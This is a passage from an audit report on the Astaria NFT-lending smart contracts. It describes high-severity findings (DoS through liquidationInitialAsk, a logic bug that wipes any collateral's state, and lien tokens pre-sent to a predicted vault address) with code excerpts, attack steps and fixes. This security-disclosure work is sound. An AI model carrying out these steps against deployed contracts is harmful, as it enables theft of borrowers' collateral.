16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Check that the vaultFee is within a reasonable range during vault creation.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/378#event-8415846539\">SantiagoGregory (Astaria) confirmed via duplicate issue <code>#378</code></a></strong></p>\n<hr>\n<h2 id=\"h-12-borrower-can-use-liquidationinitialask-to-block-future-borrowers\" style=\"position:relative;\"><a href=\"#h-12-borrower-can-use-liquidationinitialask-to-block-future-borrowers\" aria-label=\"h 12 borrower can use liquidationinitialask to block future borrowers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/289\">[H-12] Borrower can use liquidationInitialAsk to block future borrowers</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/289\">obront</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L471-L489\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L471-L489</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L153-L174\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L153-L174</a></p>\n<p>When a new lien is taken (or bought out), one of the validations is to ensure that the <code>potentialDebt</code> of each borrower on the stack is less than or equal to their <code>liquidationInitialAsk</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (potentialDebt &gt; newStack[j].lien.details.liquidationInitialAsk) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>In <code>_appendStack()</code> and <code>_buyoutLien()</code>, this is performed by iterating through the stack backwards, totaling up the <code>potentialDebt</code>, and comparing it to each lien’s <code>liquidationInitialAsk</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">for (uint256 i = stack.length; i &gt; 0; ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint256 j = i - 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      newStack[j] = stack[j];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      if (block.timestamp &gt;= newStack[j].point.end) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert InvalidState(InvalidStates.EXPIRED_LIEN);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        potentialDebt += _getOwed(newStack[j], newStack[j].point.end);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      if (potentialDebt &gt; newStack[j].lien.details.liquidationInitialAsk) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        --i;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>However, only the first item on the stack has a <code>liquidationInitialAsk</code> that matters. When a new auction is started on Seaport, <code>Router#liquidate()</code> uses <code>stack[0].lien.details.liquidationInitialAsk</code> as the starting price. The other values are meaningless, except in their ability to DOS future borrowers.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>I set my <code>liquidationInitialAsk</code> to be exactly the value of my loan</li>\n<li>A borrower has already borrowed on their collateral, and the first loan on the stack will determine the auction price</li>\n<li>When they borrow from me, my <code>liquidationInitialAsk</code> is recorded</li>\n<li>Any future borrows will check that <code>futureBorrow + myBorrow &#x3C;= myLiquidationInitialAsk</code>, which is not possible for any <code>futureBorrow > 0</code></li>\n<li>The result is that the borrower will be DOS’d from all future borrows</li>\n</ul>\n<p>This is made worse by the fact that <code>liquidationInitialAsk</code> is not a variable that can justify a refinance, so they’ll need to either pay back the loan or find a refinancier who will beat one of the other terms (rate or duration) in order to get rid of this burden.</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Get rid of all checks on <code>liquidationInitialAsk</code> except for comparing the total potential debt of the entire stack to the <code>liquidationInitialAsk</code> of the lien at position 0.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/289#issuecomment-1405635921\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The scenario is correct but I don’t think it is of high severity at first sight, considering setting <code>liquidationInitialAsk</code> too low only exposes the lender to a potential bad debt if the dutch auction settles below its debt</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/289#issuecomment-1405638218\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>However, it seems from this and other findings that leaving the <code>liquidationInitialAsk</code> at the <code>lien</code> level has multiple unintended side effects.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/289\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-13-anyone-can-wipe-complete-state-of-any-collateral-at-any-point\" style=\"position:relative;\"><a href=\"#h-13-anyone-can-wipe-complete-state-of-any-collateral-at-any-point\" aria-label=\"h 13 anyone can wipe complete state of any collateral at any point permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/287\">[H-13] Anyone can wipe complete state of any collateral at any point</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/287\">obront</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/460\">c7e7eff</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/386\">KIntern_NA</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/268\">Koolex</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L114-L167\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L114-L167</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L524-L545\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L524-L545</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L497-L510\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L497-L510</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L623-L656\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L623-L656</a></p>\n<p>The Clearing House is implemented as an ERC1155. This is used to settle up at the end of an auction. The Clearing House’s token is listed as one of the Consideration Items, and when Seaport goes to transfer it, it triggers the settlement process.</p>\n<p>This settlement process includes deleting the collateral state hash from LienToken.sol, burning all lien tokens, deleting the idToUnderlying mapping, and burning the collateral token. <strong>These changes effectively wipe out all record of the liens, as well as removing any claim the borrower has on their underlying collateral.</strong></p>\n<p>After an auction, this works as intended. The function verifies that sufficient payment has been made to meet the auction criteria, and therefore all these variables should be zeroed out.</p>\n<p>However, the issue is that there is no check that this safeTransferFrom function is being called after an auction has completed. In the case that it is called when there is no auction, all the auction criteria will be set to 0, and therefore the above deletions can be performed with a payment of 0.</p>\n<p>This allows any user to call the <code>safeTransferFrom()</code> function for any other user’s collateral. This will wipe out all the liens on that collateral, and burn the borrower’s collateral token, and with it their ability to ever reclaim their collateral.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The flow is as follows:</p>\n<ul>\n<li>safeTransferFrom(offerer, buyer, paymentToken, amount, data)</li>\n<li>_execute(offerer, buyer, paymentToken, amount)</li>\n<li>using the auctionStack in storage, it calculates the amount the auction would currently be listed at</li>\n<li>it confirms that the Clearing House has already received sufficient paymentTokens for this amount</li>\n<li>it then transfers the liquidator their payment (currently 13%)</li>\n<li>it calls <code>LienToken#payDebtViaClearingHouse()</code>, which pays back all liens, zeros out all lien storage and deletes the collateralStateHash</li>\n<li>if there is any remaining balance of paymentToken, it transfers it to the owner of the collateral</li>\n<li>it then calls <code>Collateral#settleAuction()</code>, which deletes idToUnderlying, collateralIdToAuction and burns the collateral token</li>\n</ul>\n<p>In the case where the auction hasn’t started, the <code>auctionStack</code> in storage is all set to zero. When it calculates the payment that should be made, it uses <code>_locateCurrentAmount</code>, which simply returns <code>endAmount</code> if <code>startAmount == endAmount</code>. In the case where they are all 0, this returns 0.</p>\n<p>The second check that should catch this occurs in <code>settleAuction()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.collateralIdToAuction[collateralId] == bytes32(0) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        s.idToUnderlying[collateralId].tokenId</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ) !=</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.clearingHouse[collateralId]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>However, this check accidentally uses an <code>&#x26;&#x26;</code> operator instead of a <code>||</code>. The result is that, even if the auction hasn’t started, only the first criteria is false. The second is checking whether the Clearing House owns the underlying collateral, which happens as soon as the collateral is deposited in <code>CollateralToken.sol#onERC721Received()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">      ERC721(msg.sender).safeTransferFrom(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        s.clearingHouse[collateralId],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokenId_</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the check in <code>settleAuction()</code> from an AND to an OR, which will block any collateralId that isn’t currently at auction from being settled:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.collateralIdToAuction[collateralId] == bytes32(0) ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        s.idToUnderlying[collateralId].tokenId</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ) !=</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.clearingHouse[collateralId]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/287\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-14-a-malicious-private-vault-can-preempt-the-creation-of-a-public-vault-by-transferring-lien-tokens-to-the-public-vault-thereby-preventing-the-borrower-from-repaying-all-loans\" style=\"position:relative;\"><a href=\"#h-14-a-malicious-private-vault-can-preempt-the-creation-of-a-public-vault-by-transferring-lien-tokens-to-the-public-vault-thereby-preventing-the-borrower-from-repaying-all-loans\" aria-label=\"h 14 a malicious private vault can preempt the creation of a public vault by transferring lien tokens to the public vault thereby preventing the borrower from repaying all loans permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/246\">[H-14] A malicious private vault can preempt the creation of a public vault by transferring lien tokens to the public vault, thereby preventing the borrower from repaying all loans</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/246\">cccz</a></em></p>\n<p>In LienToken.transferFrom, transferring lien tokens to the public vault is prohibited because variables such as liensOpenForEpoch are not updated when the public vault receives a lien token, which would prevent the borrower from repaying the loan in that lien token.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IERC721</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadLienStorageSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_isPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PUBLIC_VAULT_RECIPIENT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienMeta</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">atLiquidation</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">COLLATERAL_AUCTION</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienMeta</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">payee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PayeeChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>However, public vaults are created using the ClonesWithImmutableArgs.clone function, which uses the <code>create</code> opcode, which allows the address of the public vault to be predicted before it is created.</p>\n<p><a href=\"https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed\">https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                instance := </span><span class=\"mtk11\">create</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ptr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">creationSize</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span></code></pre>\n<p>This allows a malicious private vault to transfer lien tokens to the predicted public vault address in advance, and then call AstariaRouter.newPublicVault to create the public vault, which has a liensOpenForEpoch of 0.<br>\nWhen the borrower repays the loan via LienToken.makePayment, decreaseEpochLienCount fails due to overflow in _payment, resulting in the liquidation of the borrower’s collateral</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isPublicVault</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// since the openLiens count is only positive when there are liens that haven&#39;t been paid off</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// that should be liquidated, this lien should not be counted anymore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decreaseEpochLienCount</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getLienEpoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">end</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span></code></pre>\n<p>Consider the following scenario where private vault A provides a loan of 1 ETH to the borrower, who deposits NFT worth 2 ETH and borrows 1 ETH.<br>\nPrivate Vault A creates Public Vault B using the account alice and predicts the address of Public Vault B before it is created and transfers the lien tokens to it.<br>\nThe borrower calls LienToken.makePayment to repay the loan, but fails due to overflow.<br>\nThe borrower is unable to repay the loan, and when the loan expires, the NFTs used as collateral are auctioned.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 